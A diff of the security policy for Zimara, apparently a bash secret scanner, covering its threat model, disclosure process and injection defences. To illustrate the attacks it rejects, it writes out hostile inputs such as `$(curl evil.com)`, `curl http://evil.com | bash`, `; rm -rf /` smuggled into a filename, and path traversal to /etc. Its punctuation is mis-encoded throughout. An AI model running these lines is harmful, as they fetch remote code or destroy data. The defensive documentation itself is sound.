@@ -1,18 +1,18 @@
 # Security Policy
 
-**Version:** 0.48.0  
-**Published by:** Oob Skulden‚Ñ¢
+**Version:** 0.49.5  
+**Published by:** Oob Skuldenô
 
-Yes, a security tool has a security policy. Because irony is alive and well, and also because bad guys don‚Äôt respect job titles.
+Yes, a security tool has a security policy. Because irony is alive and well, and also because bad guys donít respect job titles.
 
 
 ## Related Documentation
 
-- [**CHECKS.md**][checks] ‚Äì Complete reference for all 45 security checks  
-- [**INTEGRATION.md**][integration] ‚Äì Git hooks, CI/CD setup, and team adoption
-- [**SECURITY.md**][security] ‚Äì Security considerations, trust boundaries, and safe-usage guidance  
-- [**CHANGELOG.md**](CHANGELOG.md) ‚Äì Release history and notable changes
-- [**LICENSE**][license] ‚Äì AGPL-3.0  
+- [**CHECKS.md**][checks] ñ Complete reference for all 45 security checks  
+- [**INTEGRATION.md**][integration] ñ Git hooks, CI/CD setup, and team adoption
+- [**SECURITY.md**][security] ñ Security considerations, trust boundaries, and safe-usage guidance  
+- [**CHANGELOG.md**](CHANGELOG.md) ñ Release history and notable changes
+- [**LICENSE**][license] ñ AGPL-3.0  
 
 [checks]: CHECKS.md
 [integration]: INTEGRATION.md
@@ -25,19 +25,19 @@ Yes, a security tool has a security policy. Because irony is alive and well, and
 
 ## Reporting Security Issues
 
-Found a way to make Zimara do something it shouldn‚Äôt? Good catch. Here‚Äôs what to do:
+Found a way to make Zimara do something it shouldnít? Good catch. Hereís what to do:
 
-**DO NOT open a public GitHub issue.** That‚Äôs like announcing you found the keys under the mat.
+**DO NOT open a public GitHub issue.** Thatís like announcing you found the keys under the mat.
 
 Instead:
 
 ### Primary: GitHub Security Advisories (Preferred)
 
-Use GitHub‚Äôs private vulnerability reporting:
+Use GitHubís private vulnerability reporting:
 
 **Report here:** https://github.com/oob-skulden/zimara/security/advisories/new
 
-This creates a private advisory that only maintainers can see. It‚Äôs secure, tracked, and built into GitHub.
+This creates a private advisory that only maintainers can see. Itís secure, tracked, and built into GitHub.
 
 **Include:**
 
@@ -51,11 +51,11 @@ This creates a private advisory that only maintainers can see. It‚Äôs secure, tr
 
 This is a solo open-source project. I aim to:
 
-- **Within 1 week:** Acknowledge receipt and confirm it‚Äôs a real issue
+- **Within 1 week:** Acknowledge receipt and confirm itís a real issue
 - **Within 30 days:** Provide initial assessment and timeline for a fix
 - **Within 60 days:** Release a patch or provide detailed status update
 
-Life happens. If I‚Äôm slower than this, I‚Äôm probably dealing with something urgent IRL. The goal is responsible disclosure, not breaking speed records.
+Life happens. If Iím slower than this, Iím probably dealing with something urgent IRL. The goal is responsible disclosure, not breaking speed records.
 
 **What happens next:**
 
@@ -65,78 +65,82 @@ Life happens. If I‚Äôm slower than this, I‚Äôm probably dealing with something u
 1. I credit you (unless you prefer anonymity)
 1. I publish a security advisory with details
 
-**Bug bounty program:** There isn‚Äôt one. This is a free bash script published on the internet. If you want compensation, I can offer heartfelt gratitude and your name in the credits. That‚Äôs the deal.
+**Bug bounty program:** There isnít one. This is a free bash script published on the internet. If you want compensation, I can offer heartfelt gratitude and your name in the credits. Thatís the deal.
 
 -----
 
-## Zimara‚Äôs Security Model (Or: What Could Possibly Go Wrong?)
+## Zimaraís Security Model (Or: What Could Possibly Go Wrong?)
 
-Zimara is a bash script that scans files for security problems. That‚Äôs a bit like asking a guard dog to guard itself. Here‚Äôs how we think about it:
+Zimara is a bash script that scans files for security problems. Thatís a bit like asking a guard dog to guard itself. Hereís how we think about it:
 
 ### Threat Model
 
 **What we assume:**
 
-- **You‚Äôre running Zimara in a repo you trust** (or at least don‚Äôt actively distrust)
-- **The repository content might be malicious** (that‚Äôs the whole point of scanning it)
-- **Your system binaries are legit** (git, grep, find, bash ‚Äî if these are compromised, you have bigger problems)
+- **Youíre running Zimara in a repo you trust** (or at least donít actively distrust)
+- **The repository content might be malicious** (thatís the whole point of scanning it)
+- **Your system binaries are legit** (git, grep, find, bash ó if these are compromised, you have bigger problems)
 - **Attackers will try to exploit Zimara** (via crafted repo content, malicious .zimaraignore patterns, symlink tricks, etc.)
 - **You have basic operational security** (not running as root, using reasonable file permissions, etc.)
 
-**What we don‚Äôt assume:**
+**What we donít assume:**
 
 - That you read documentation (but you should)
 - That you understand regex (but CHECK 04 hopes you do)
-- That you won‚Äôt try to bypass findings with `--no-verify` (please don‚Äôt)
-- That AWS will stop charging you when your leaked key gets used (they won‚Äôt)
+- That you wonít try to bypass findings with `--no-verify` (please donít)
+- That AWS will stop charging you when your leaked key gets used (they wonít)
 
 ### Security Boundaries
 
 Things Zimara actively protects against:
 
-‚úÖ **Command injection via .zimaraignore**  
+? **Command injection via .zimaraignore**  
 Patterns are validated with character whitelisting. No shell metacharacters, no argument injection, no path traversal. If you try `$(curl evil.com)` in .zimaraignore, Zimara will reject it and log a warning.
 
-‚úÖ **Symlink attacks in temp files**  
-Temp files are created with `mktemp`, ownership-checked, and verified as regular files (not symlinks). We don‚Äôt trust filesystem race conditions.
+? **Symlink attacks in temp files**  
+Temp files are created with `mktemp`, ownership-checked, and verified as regular files (not symlinks). We donít trust filesystem race conditions.
 
-‚úÖ **Path traversal via user input**  
-Target directory is canonicalized and validated against an allowlist. You can‚Äôt trick Zimara into scanning `/etc/passwd` by passing `../../etc`.
+? **Path traversal via user input**  
+Target directory is canonicalized and validated against an allowlist. You canít trick Zimara into scanning `/etc/passwd` by passing `../../etc`.
 
-‚úÖ **Execution of untrusted code from the repo**  
-Zimara never `eval`s, `source`s, or executes content from the repository being scanned. It reads files and pattern-matches them. That‚Äôs it.
+? **Execution of untrusted code from the repo**  
+Zimara never `eval`s, `source`s, or executes content from the repository being scanned. It reads files and pattern-matches them. Thatís it.
 
-‚úÖ **World-writable git hooks**  
+? **World-writable git hooks**  
 CHECK 44 specifically looks for hooks that are writable by others. If your pre-commit hook has mode 777, Zimara will complain loudly.
 
-‚úÖ **Malicious binary substitution (best effort)**  
-Critical binaries (git, grep, find) are resolved to absolute paths with trust validation. We prefer `/usr/bin/git` over whatever‚Äôs in `./git`. We also reject world-writable binaries.
+? **Malicious binary substitution (best effort)**  
+Critical binaries (git, grep, find) are resolved to absolute paths with trust validation. We prefer `/usr/bin/git` over whateverís in `./git`. We also reject world-writable binaries.
+
+? **Structured output security (JSON/SARIF)**  
+Content-aware fingerprinting prevents secret leakage in structured exports. Finding messages never contain actual secret values, only safe references. Baseline files are validated against real file content ó you can't bypass findings by editing baseline JSON.
+
 
 Things Zimara does NOT protect against:
 
-‚ùå **Compromised system binaries**  
+? **Compromised system binaries**  
 If someone replaced your `/usr/bin/git` with a malicious version, Zimara will happily use it. Check your package signatures.
 
-‚ùå **You running malicious code yourself**  
-Zimara will tell you ‚Äúhey, this looks sketchy‚Äù but it won‚Äôt stop you from running `curl http://evil.com | bash` if you really want to. Free will is a thing.
+? **You running malicious code yourself**  
+Zimara will tell you ìhey, this looks sketchyî but it wonít stop you from running `curl http://evil.com | bash` if you really want to. Free will is a thing.
 
-‚ùå **Supply chain attacks in dependencies**  
-Zimara checks if you have npm audit issues (CHECK 14), but it doesn‚Äôt verify the integrity of npm itself, or that your node_modules aren‚Äôt haunted.
+? **Supply chain attacks in dependencies**  
+Zimara checks if you have npm audit issues (CHECK 14), but it doesnít verify the integrity of npm itself, or that your node_modules arenít haunted.
 
-‚ùå **Social engineering**  
-If someone convinces you to add `vendor/*` to .zimaraignore and then hides secrets in `vendor/`, that‚Äôs not a Zimara vulnerability. That‚Äôs a people problem.
+? **Social engineering**  
+If someone convinces you to add `vendor/*` to .zimaraignore and then hides secrets in `vendor/`, thatís not a Zimara vulnerability. Thatís a people problem.
 
-‚ùå **Zero-day vulnerabilities in bash**  
+? **Zero-day vulnerabilities in bash**  
 Zimara is written in bash. If bash has a critical vulnerability, Zimara inherits it. Update your system.
 
-‚ùå **Quantum computers**  
+? **Quantum computers**  
 Not yet, anyway.
 
 -----
 
 ## Known Limitations (The Fine Print)
 
-Zimara is good at what it does, but it‚Äôs not magic. Here‚Äôs what to keep in mind:
+Zimara is good at what it does, but itís not magic. Hereís what to keep in mind:
 
 ### 1. Pattern Matching Has Limits
 
@@ -147,10 +151,10 @@ Zimara uses regex patterns for secret detection. Sometimes legitimate code looks
 const exampleKey = "AKIA00000000EXAMPLE1234"; // This triggers CHECK 04
 ```
 
-That‚Äôs why .zimaraignore exists. Use it wisely.
+Thatís why .zimaraignore exists. Use it wisely.
 
 **False Negatives:**  
-Sophisticated attackers don‚Äôt hardcode secrets as `AWS_KEY=AKIA...`. They obfuscate, encode, split across files, or use other tricks. Zimara catches the obvious stuff. It‚Äôs not a substitute for proper secret management.
+Sophisticated attackers donít hardcode secrets as `AWS_KEY=AKIA...`. They obfuscate, encode, split across files, or use other tricks. Zimara catches the obvious stuff. Itís not a substitute for proper secret management.
 
 ### 2. Git History Scanning Requires Full Clones
 
@@ -166,19 +170,19 @@ This is by design but also the biggest footgun. If you add this to .zimaraignore
 src/*
 ```
 
-You‚Äôve just excluded your entire source directory from scanning. Congratulations, you‚Äôve built a very fast security scanner that scans nothing.
+Youíve just excluded your entire source directory from scanning. Congratulations, youíve built a very fast security scanner that scans nothing.
 
-**Defense:** Zimara warns you about overly broad patterns (`*`, `*/*`, etc.) but it won‚Äôt stop you. Adults get to make bad decisions.
+**Defense:** Zimara warns you about overly broad patterns (`*`, `*/*`, etc.) but it wonít stop you. Adults get to make bad decisions.
 
 ### 4. Some Checks Are Heuristic
 
-CHECK 20 (Output JS Key Exposure) looks for patterns that resemble API keys in JavaScript bundles. It‚Äôs not doing semantic analysis or control-flow tracking. It‚Äôs grep with anxiety.
+CHECK 20 (Output JS Key Exposure) looks for patterns that resemble API keys in JavaScript bundles. Itís not doing semantic analysis or control-flow tracking. Itís grep with anxiety.
 
 This means:
 
 - It might miss obfuscated keys
 - It might flag commented-out code
-- It won‚Äôt understand that the key is restricted to localhost
+- It wonít understand that the key is restricted to localhost
 
 These are informed guesses, not guarantees.
 
@@ -187,8 +191,8 @@ These are informed guesses, not guarantees.
 This is a feature, not a bug, but it has implications:
 
 - **No central enforcement:** Developers can bypass hooks with `--no-verify`
-- **No audit trail:** You don‚Äôt know if people are actually running it
-- **No updates enforcement:** Old Zimara versions don‚Äôt auto-update
+- **No audit trail:** You donít know if people are actually running it
+- **No updates enforcement:** Old Zimara versions donít auto-update
 
 If you need centralized control, run Zimara in CI and enforce required checks there. See <INTEGRATION.md> for details.
 
@@ -198,7 +202,7 @@ If you need centralized control, run Zimara in CI and enforce required checks th
 
 ### Running on Untrusted Repositories
 
-Scanning a repo you don‚Äôt fully trust? (Third-party code, sketchy fork, cursed legacy system?) Here‚Äôs how to be careful:
+Scanning a repo you donít fully trust? (Third-party code, sketchy fork, cursed legacy system?) Hereís how to be careful:
 
 **Platform note:** These examples assume Linux/macOS or Windows WSL 2. For native Windows support via Docker, see [INTEGRATION.md - Windows Support](INTEGRATION.md#windows-support-via-docker-desktop).
 
@@ -227,7 +231,7 @@ Run Zimara in a VM, take a snapshot first, revert after scanning. Paranoid but e
 
 **Option 3: Read-Only Filesystem**
 
-Mount the repo read-only if you‚Äôre only scanning (not fixing):
+Mount the repo read-only if youíre only scanning (not fixing):
 
 ```bash
 mount --bind -o ro /path/to/repo /mnt/scan-target
@@ -243,13 +247,13 @@ Review .zimaraignore before trusting it. If you see:
 *
 ```
 
-Someone‚Äôs hiding something.
+Someoneís hiding something.
 
 ### Hook Security Best Practices
 
-Pre-commit hooks execute code on every commit. That‚Äôs powerful and dangerous.
+Pre-commit hooks execute code on every commit. Thatís powerful and dangerous.
 
-**Zimara‚Äôs hook security features:**
+**Zimaraís hook security features:**
 
 1. **Permission checking (CHECK 44):**  
    Warns if hooks are writable by others. Hooks should be mode 700 (owner-only).
@@ -276,7 +280,7 @@ cat .git/hooks/pre-commit
 - Hook owned by someone else
 - Hook is world-writable (mode 777)
 - Hook is a symlink pointing outside the repo
-- Hook contains commands you don‚Äôt recognize
+- Hook contains commands you donít recognize
 
 ### .zimaraignore Security
 
@@ -299,7 +303,7 @@ $(curl evil.com)         # Command substitution
 test;rm -rf /            # Shell metacharacters
 ```
 
-Each rejected pattern logs a warning but doesn‚Äôt break the scan.
+Each rejected pattern logs a warning but doesnít break the scan.
 
 **What you should reject:**
 
@@ -319,7 +323,7 @@ node_modules/*           # Dependencies (already excluded by default)
 dist/*                   # Build artifacts (use --only-output instead)
 ```
 
-Always comment why you‚Äôre excluding something. Future you will thank present you.
+Always comment why youíre excluding something. Future you will thank present you.
 
 -----
 
@@ -354,17 +358,17 @@ Zimara uses semantic versioning with security in mind:
 
 Security fixes are released as patch versions and noted clearly in:
 
-1. **Release notes** ‚Äî ‚ÄúSECURITY: Fixed command injection in .zimaraignore parsing‚Äù
-1. **This file** ‚Äî Updated with details after disclosure period
-1. **Git tags** ‚Äî Tagged with `security-fix-` prefix
+1. **Release notes** ó ìSECURITY: Fixed command injection in .zimaraignore parsingî
+1. **This file** ó Updated with details after disclosure period
+1. **Git tags** ó Tagged with `security-fix-` prefix
 
-If you‚Äôre using Zimara in production CI, pin to major.minor (e.g., `v0.48.x`) and update promptly when security patches drop.
+If youíre using Zimara in production CI, pin to major.minor (e.g., `v0.48.x`) and update promptly when security patches drop.
 
 ### Disclosure Timeline
 
 **Before public release:**
 
-- 0-7 days: Validate report, confirm it‚Äôs real
+- 0-7 days: Validate report, confirm itís real
 - 7-30 days: Develop and test fix
 - 30-60 days: Public disclosure (or sooner if actively exploited in the wild)
 
@@ -376,31 +380,50 @@ If you‚Äôre using Zimara in production CI, pin to major.minor (e.g., `v0.48.x`) 
 
 If you reported the issue, you get credited (unless you prefer anonymity).
 
-**Reality check:** I‚Äôm one person doing this in spare time. If something critical drops during the holidays or when I‚Äôm dealing with a work emergency, timelines might slip. But I will communicate status and won‚Äôt ghost you.
+**Reality check:** Iím one person doing this in spare time. If something critical drops during the holidays or when Iím dealing with a work emergency, timelines might slip. But I will communicate status and wonít ghost you.
 
 -----
 
 ## Security Features by Version
 
-Here‚Äôs what security hardening has been added over time:
+Here's what security hardening has been added over time:
 
-### v0.48.0 (Current)
+### v0.49.5 (Current)
 
-- ‚úÖ .zimaraignore injection prevention (character whitelisting, pattern validation)
-- ‚úÖ Snippet output security (safe handling of binary files, line truncation)
-- ‚úÖ Enhanced path validation (canonical path checking, symlink detection)
+- ? Improved execution model (set -u, set -o pipefail without set -e)
+- ? Complete scan coverage ensuring all 45 checks execute
+- ? Enhanced reliability for comprehensive security scanning
+
+### v0.49.1
+
+- ? Bash 3.2+ compatibility for legacy systems
+- ? Baseline bypass prevention in structured outputs
+- ? Enhanced content-aware fingerprinting
+
+### v0.49.0
+
+- ? Structured output security (JSON/SARIF)
+- ? Safe message construction preventing secret leakage
+- ? Baseline validation against file content
+- ? Content-aware fingerprinting for findings
+
+### v0.48.0
+
+- ? .zimaraignore injection prevention (character whitelisting, pattern validation)
+- ? Snippet output security (safe handling of binary files, line truncation)
+- ? Enhanced path validation (canonical path checking, symlink detection)
 
 ### v0.47.0
 
-- ‚úÖ Git history scanning (CHECK 17)
-- ‚úÖ Hook permission checking (CHECK 44)
-- ‚úÖ Trusted binary resolution with world-writable rejection
+- ? Git history scanning (CHECK 17)
+- ? Hook permission checking (CHECK 44)
+- ? Trusted binary resolution with world-writable rejection
 
 ### v0.46.0 and earlier
 
-- ‚úÖ Basic secret pattern matching
-- ‚úÖ Private key detection
-- ‚úÖ Temp file security (ownership checks, cleanup traps)
+- ? Basic secret pattern matching
+- ? Private key detection
+- ? Temp file security (ownership checks, cleanup traps)
 
 See CHANGELOG.md for complete version history.
 
@@ -408,7 +431,7 @@ See CHANGELOG.md for complete version history.
 
 ## Threat Scenarios and Mitigations
 
-Here‚Äôs how Zimara handles specific attack scenarios:
+Hereís how Zimara handles specific attack scenarios:
 
 ### Scenario 1: Malicious .zimaraignore
 
@@ -444,7 +467,7 @@ Zimara uses `mktemp` which is race-safe, then explicitly checks:
 ; rm -rf /.txt
 ```
 
-Hoping that Zimara‚Äôs file processing will execute the command.
+Hoping that Zimaraís file processing will execute the command.
 
 **Mitigation:**  
 Zimara uses `find -print0 | xargs -0` for null-delimited processing, and all grep operations use fixed patterns or properly escaped regex. Filenames are never passed to shell evaluation.
@@ -459,12 +482,12 @@ Zimara uses `find -print0 | xargs -0` for null-delimited processing, and all gre
 zimara ../../../../../../etc
 ```
 
-Hoping to scan system files they shouldn‚Äôt access.
+Hoping to scan system files they shouldnít access.
 
 **Mitigation:**  
 Target directory is canonicalized with `cd` + `pwd -P`, then validated against an allowlist of safe locations (current working tree, user home, /tmp). Zimara refuses to scan `/etc` or other system directories.
 
-**Result:** Attack fails with error: ‚ÄúRefusing to scan outside allowed paths‚Äù
+**Result:** Attack fails with error: ìRefusing to scan outside allowed pathsî
 
 ### Scenario 5: Binary Substitution
 
@@ -481,7 +504,7 @@ Zimara resolves critical binaries to absolute paths using a safe PATH that exclu
 
 -----
 
-## What We Won‚Äôt Fix (And Why)
+## What We Wonít Fix (And Why)
 
 Some things are limitations, not bugs:
 
@@ -489,16 +512,16 @@ Some things are limitations, not bugs:
 
 **Issue:** Zimara flags test fixtures with fake API keys.
 
-**Why we won‚Äôt ‚Äúfix‚Äù it:**  
-This is working as designed. Use .zimaraignore for legitimate test data. The alternative (trying to detect ‚Äúfake‚Äù vs ‚Äúreal‚Äù keys) is impossible without a ground-truth database.
+**Why we wonít ìfixî it:**  
+This is working as designed. Use .zimaraignore for legitimate test data. The alternative (trying to detect ìfakeî vs ìrealî keys) is impossible without a ground-truth database.
 
 **Mitigation:** Document your test fixtures in .zimaraignore.
 
-### 2. Developers Bypassing with ‚Äìno-verify
+### 2. Developers Bypassing with ñno-verify
 
 **Issue:** Developers can skip pre-commit hooks with `git commit --no-verify`.
 
-**Why we won‚Äôt ‚Äúfix‚Äù it:**  
+**Why we wonít ìfixî it:**  
 This is a Git feature, not a Zimara bug. If you need enforcement, use CI. See <INTEGRATION.md>.
 
 **Mitigation:** Run Zimara in CI with required checks.
@@ -507,8 +530,8 @@ This is a Git feature, not a Zimara bug. If you need enforcement, use CI. See <I
 
 **Issue:** Zimara is slow on repos with 100,000+ files.
 
-**Why we won‚Äôt ‚Äúfix‚Äù it:**  
-Zimara uses grep and find, which are fast for normal repos but linear-time on file count. The alternative (complex indexing, binary dependencies) defeats the ‚Äúsimple bash script‚Äù design goal.
+**Why we wonít ìfixî it:**  
+Zimara uses grep and find, which are fast for normal repos but linear-time on file count. The alternative (complex indexing, binary dependencies) defeats the ìsimple bash scriptî design goal.
 
 **Mitigation:** Use `--only-output` to scan just build artifacts, or exclude large directories with .zimaraignore.
 
@@ -516,16 +539,16 @@ Zimara uses grep and find, which are fast for normal repos but linear-time on fi
 
 **Issue:** If `/usr/bin/git` is compromised, Zimara is compromised.
 
-**Why we won‚Äôt ‚Äúfix‚Äù it:**  
-If your system binaries are compromised, you have a root-level compromise. Zimara can‚Äôt defend against that. Neither can any other userspace tool.
+**Why we wonít ìfixî it:**  
+If your system binaries are compromised, you have a root-level compromise. Zimara canít defend against that. Neither can any other userspace tool.
 
-**Mitigation:** Verify your system package signatures. Run Zimara in a container if you‚Äôre paranoid.
+**Mitigation:** Verify your system package signatures. Run Zimara in a container if youíre paranoid.
 
 -----
 
 ## Compliance and Auditing
 
-Zimara itself doesn‚Äôt generate compliance reports, but here‚Äôs how it fits into compliance frameworks:
+Zimara itself doesnít generate compliance reports, but hereís how it fits into compliance frameworks:
 
 ### SOC 2 / ISO 27001
 
@@ -547,7 +570,7 @@ Zimara itself doesn‚Äôt generate compliance reports, but here‚Äôs how it fits in
 - 6.3.2: Review custom code for vulnerabilities (Zimara assists with secret detection)
 - 8.2.1: Strong authentication (Zimara prevents credential leaks)
 
-**Not sufficient alone:** Zimara is a pre-commit check, not a SAST tool. You‚Äôll need additional tooling for full PCI compliance.
+**Not sufficient alone:** Zimara is a pre-commit check, not a SAST tool. Youíll need additional tooling for full PCI compliance.
 
 ### NIST Cybersecurity Framework
 
@@ -557,21 +580,21 @@ Zimara itself doesn‚Äôt generate compliance reports, but here‚Äôs how it fits in
 - **Protect:** Access control (CHECK 03 private keys, CHECK 04 secrets)
 - **Detect:** Security monitoring (all checks)
 
-Zimara is an ‚ÄúIdentify‚Äù and ‚ÄúProtect‚Äù control. It‚Äôs not ‚ÄúRespond‚Äù or ‚ÄúRecover.‚Äù
+Zimara is an ìIdentifyî and ìProtectî control. Itís not ìRespondî or ìRecover.î
 
 -----
 
 ## Responsible Disclosure Examples
 
-Here‚Äôs how we‚Äôd handle a real security issue:
+Hereís how weíd handle a real security issue:
 
 ### Example 1: Command Injection in .zimaraignore (Hypothetical)
 
-**Day 0:** Security researcher reports via GitHub Security Advisory: ‚ÄúFound command injection in .zimaraignore parsing‚Äù
+**Day 0:** Security researcher reports via GitHub Security Advisory: ìFound command injection in .zimaraignore parsingî
 
 **Day 3:** I confirm the issue, assign CVE (if warranted), start developing fix
 
-**Day 14:** Fix developed, tested against researcher‚Äôs PoC, works correctly
+**Day 14:** Fix developed, tested against researcherís PoC, works correctly
 
 **Day 21:** Release v0.48.1 with patch, security advisory published
 
@@ -597,9 +620,9 @@ Credit: Jane Researcher (@security_jane)
 
 ### Example 2: Information Disclosure via Verbose Mode (Hypothetical)
 
-**Day 0:** User reports via GitHub: ‚ÄúZimara ‚Äìverbose leaks secrets in log output‚Äù
+**Day 0:** User reports via GitHub: ìZimara ñverbose leaks secrets in log outputî
 
-**Day 5:** I investigate, confirm that snippet output can echo secrets when they‚Äôre found
+**Day 5:** I investigate, confirm that snippet output can echo secrets when theyíre found
 
 **Day 12:** I add secret masking to snippet output, release v0.48.2
 
@@ -631,7 +654,7 @@ Credit: Internal testing
 For security issues, contact via:
 
 **Primary:** GitHub Security Advisories (private reporting)  
-‚Üí https://github.com/oob-skulden/zimara/security/advisories/new
+? https://github.com/oob-skulden/zimara/security/advisories/new
 
 **Response Time:**
 
@@ -641,9 +664,9 @@ For security issues, contact via:
 
 **What NOT to report:**
 
-- ‚ÄúZimara didn‚Äôt catch my secret‚Äù ‚Äî that‚Äôs a feature request, not a vulnerability
-- ‚ÄúI bypassed Zimara with ‚Äìno-verify‚Äù ‚Äî that‚Äôs Git, not Zimara
-- ‚ÄúZimara is slow‚Äù ‚Äî that‚Äôs a performance issue, not a security issue
+- ìZimara didnít catch my secretî ó thatís a feature request, not a vulnerability
+- ìI bypassed Zimara with ñno-verifyî ó thatís Git, not Zimara
+- ìZimara is slowî ó thatís a performance issue, not a security issue
 
 **What TO report:**
 
@@ -651,39 +674,39 @@ For security issues, contact via:
 - Path traversal
 - Privilege escalation
 - Information disclosure
-- Anything that lets Zimara do something it shouldn‚Äôt
+- Anything that lets Zimara do something it shouldnít
 
 -----
 
 ## Acknowledgments
 
-Security researchers who‚Äôve helped make Zimara better:
+Security researchers whoíve helped make Zimara better:
 
 (This section will be updated as researchers report issues)
 
-- **Your name here?** ‚Äî Found a bug? Report it responsibly and get credited.
+- **Your name here?** ó Found a bug? Report it responsibly and get credited.
 
 -----
 
 ## Philosophical Note on Security Tools
 
-Zimara is a security tool. That means it gets attacked. That‚Äôs not paranoia, that‚Äôs reality.
+Zimara is a security tool. That means it gets attacked. Thatís not paranoia, thatís reality.
 
 We take security seriously because:
 
-1. **Trust is earned.** You‚Äôre running our code on your repos. That‚Äôs a privilege.
+1. **Trust is earned.** Youíre running our code on your repos. Thatís a privilege.
 1. **We eat our own dog food.** Zimara scans itself before every release.
-1. **Security tools that aren‚Äôt secure are worse than no tools.** They create false confidence.
+1. **Security tools that arenít secure are worse than no tools.** They create false confidence.
 
 But also:
 
-- **Zimara is a bash script.** It‚Äôs not a fortress. It‚Äôs a flashlight.
-- **Perfect security doesn‚Äôt exist.** We aim for ‚Äúreasonable given the threat model.‚Äù
-- **Users are part of the security model.** Don‚Äôt commit secrets. Use .zimaraignore responsibly. Run updates.
+- **Zimara is a bash script.** Itís not a fortress. Itís a flashlight.
+- **Perfect security doesnít exist.** We aim for ìreasonable given the threat model.î
+- **Users are part of the security model.** Donít commit secrets. Use .zimaraignore responsibly. Run updates.
 
-If you find a way to break Zimara, tell us. We‚Äôll fix it, credit you, and make it better.
+If you find a way to break Zimara, tell us. Weíll fix it, credit you, and make it better.
 
-That‚Äôs the deal.
+Thatís the deal.
 
 -----
 
@@ -691,7 +714,7 @@ That‚Äôs the deal.
 Pull requests welcome. See <CONTRIBUTING.md> (if you have one)
 
 **To enable GitHub Security Advisories on your fork:**  
-Settings ‚Üí Code security and analysis ‚Üí Enable ‚ÄúPrivate vulnerability reporting‚Äù
+Settings ? Code security and analysis ? Enable ìPrivate vulnerability reportingî
 
-**Published by Oob Skulden‚Ñ¢**  
-The threats you don‚Äôt see coming.
+**Published by Oob Skuldenô**  
+The threats you donít see coming.
